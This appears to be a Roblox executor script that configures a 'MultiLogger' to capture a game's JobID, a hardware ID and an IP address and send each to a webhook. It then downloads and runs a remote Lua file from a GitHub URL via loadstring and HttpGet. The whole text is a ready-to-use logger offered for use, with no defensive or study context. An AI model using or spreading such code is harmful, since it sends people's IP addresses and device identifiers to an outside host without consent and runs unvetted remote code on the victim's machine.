getgenv().MultiLogger = {
    LogInfo = {
        JobID = {
            ["Enable"] = true,
            ["Webhook"] = "YOUR_WEBHOOK_HERE",
        },
        Hwid = {
            ["Enable"] = true,
            ["Webhook"] = "YOUR_WEBHOOK_HERE",
        },
        Ip = {
            ["Enable"] = true,
            ["Webhook"] = "YOUR_WEBHOOK_HERE",
        }
    }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/MultiLogger/MutliLogger-Roblox/main/logger.lua"))()
